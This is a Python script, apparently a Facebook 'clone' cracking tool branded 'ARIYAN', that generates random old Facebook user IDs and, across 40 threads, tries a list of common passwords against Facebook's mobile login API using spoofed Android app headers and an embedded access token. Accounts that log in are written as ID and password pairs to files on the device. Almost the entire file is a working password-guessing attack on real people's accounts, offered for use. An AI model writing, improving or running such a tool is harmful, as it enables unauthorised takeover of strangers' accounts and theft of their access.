import os,time,random,json,sys,random
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
M = '\x1b[38;5;205m'
    
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    
dddd = "Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.08.0.1;CHP7800Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CPH3818Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.08.0.1;CPH3818Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=720, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.010.0.1;CPH3818Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.08.0.1;CPH3818Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.011.0.1;CPH3818Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CHP7800Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;],","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CHP7800Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CPH3818Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CPH3818Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.08.0.1;CHP7800Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.07.0.1;CHP7800Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.011.0.1;CHP7800Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.013.0.1;CHP7800Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13,Dalvik/2.1.0 (Linux; U; Android 5.08.0.1;CPH3818Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]",
os.system("clear")
logo=(f"""
    
{G1}█████╗ ██████╗ ██╗██╗   ██╗ █████╗ ███╗   ██╗
{G2}██╔══██╗██╔══██╗██║╚██╗ ██╔╝██╔══██╗████╗  ██║
{G3}███████║██████╔╝██║ ╚████╔╝ ███████║██╔██╗ ██║
{G4}██╔══██║██╔══██╗██║  ╚██╔╝  ██╔══██║██║╚██╗██║
{G5}██║  ██║██║  ██║██║   ██║   ██║  ██║██║ ╚████║
{G6}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
                                              
                                              
                                              
                                              
                                              
                                              
                                              
                                              

{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{A} ARIYAN
{G1}[{A}≈{G1}]{G1} TOOL TYPE {A}➢{A} OLD CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} {G1}{A}INFINITY
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PERSONAL
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    
def main():
    user=[]
    print(logo)
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1000 - 5000 - 10000 - 99999{G1}]{G1}')
    limit=input(f"{G1}[{A}≈{G1}]{G1} ENTER YOUR CRACK LIMIT:{A} ")
    linex()
    print(f"{G1}[{A}1{G1}]{G1}Crack 2011-14 Id")
    print(f"{G1}[{A}2{G1}]{G1}Crack 2009-10 Id")
    linex()
    ask=input(f"{G1}[{A}≈{G1}]{G1} choice :")
    os.system("clear")
    print(logo)
    
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=40) as heron:
        
        
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    ua = random.choice(dddd)
    try:
        sys.stdout.write(f"\r {R}[{W}ARIYAN-AN{R}] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush() 
        for pw in ["123456","1234567","12345678","123456789","123123","1234567890","12341234","121212","1234512345"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua, 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [OK-ID] {uid} • {pw}")
                open("/sdcard/TAMIM-XD[OK].txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [OK-ID] {uid} • {pw}")
                open("/sdcard/ARIYAN-AN[OK].txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass

main()